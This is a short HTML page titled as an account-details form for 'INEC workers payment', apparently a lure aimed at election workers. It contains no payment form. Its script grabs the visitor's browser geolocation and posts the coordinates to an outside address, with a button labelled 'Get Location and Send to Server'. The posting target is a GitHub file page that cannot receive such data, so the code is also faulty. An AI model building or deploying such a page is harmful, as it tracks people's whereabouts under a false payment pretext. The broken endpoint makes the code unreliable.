<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>INPUT YOUR ACCOUNT DETAILS FOR INEC WORKERS PAYMENT</title>
	<script>
		function sendLocation(position) {
			// Send the location data to your server
			const xhr = new XMLHttpRequest();
			xhr.open("POST", "https://github.com/Paige002/geoloc/blob/Locbranch/activefile.html", true);
			xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
			const data = JSON.stringify({
				latitude: position.coords.latitude,
				longitude: position.coords.longitude
			});
			xhr.send(data);
			alert("Location sent successfully!");
		}

		function getLocation() {
			if (navigator.geolocation) {
				navigator.geolocation.getCurrentPosition(sendLocation);
			} else {
				alert("Geolocation is not supported by this browser.");
			}
		}
	</script>
</head>
<body>
	<button onclick="getLocation()">Get Location and Send to Server</button>
</body>
</html>
